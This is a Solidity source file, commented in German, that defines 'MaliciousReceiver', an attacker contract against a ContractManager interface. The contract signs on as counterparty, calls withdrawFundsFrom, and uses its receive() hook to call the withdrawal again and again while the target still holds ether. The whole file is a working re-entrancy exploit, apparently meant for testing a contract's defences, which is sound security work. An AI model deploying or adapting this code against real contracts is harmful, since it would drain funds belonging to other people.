// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/// Minimal-Interface des Ziel-Contracts
interface IContractManager {
    function withdrawFundsFrom(uint256 contractId) external;
    function signContract(uint256 contractId) external;
}

/**
 * Angreifer-Contract, der sich als Gegenpartei registrieren lässt
 * und beim Withdraw eine Re-Entrancy versucht.
 */
contract MaliciousReceiver {
    IContractManager public target;
    uint256 public attackId;

    /**
     * @param _target Adresse des zu attackierenden ContractManager
     */
    constructor(address _target) {
        target = IContractManager(_target);
    }

    /* ------------------------------------------------------------
       Hilfs-/Proxy-Funktion, damit dieses Contract die Rolle der
       Counterparty übernehmen und den Vertrag unterschreiben kann
    ------------------------------------------------------------ */
    function signContract(uint256 _id) external {
        target.signContract(_id);
    }

    /* ------------------------------------------------------------
       Startet den eigentlichen Angriff: ruft zuerst withdraw auf,
       woraufhin bei der Ether-Überweisung der receive-Hook feuert
       und erneut withdraw aufruft (Re-Entrancy).
    ------------------------------------------------------------ */
    function attack(uint256 _id) external {
        attackId = _id;
        target.withdrawFundsFrom(_id);
    }

    /* ------------------------------------------------------------
       Receive-Hook: Wird beim ersten Ether-Transfer ausgelöst und
       versucht erneut withdraw, solange im Ziel-Contract noch
       Guthaben liegt.
    ------------------------------------------------------------ */
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawFundsFrom(attackId);
        }
    }
}
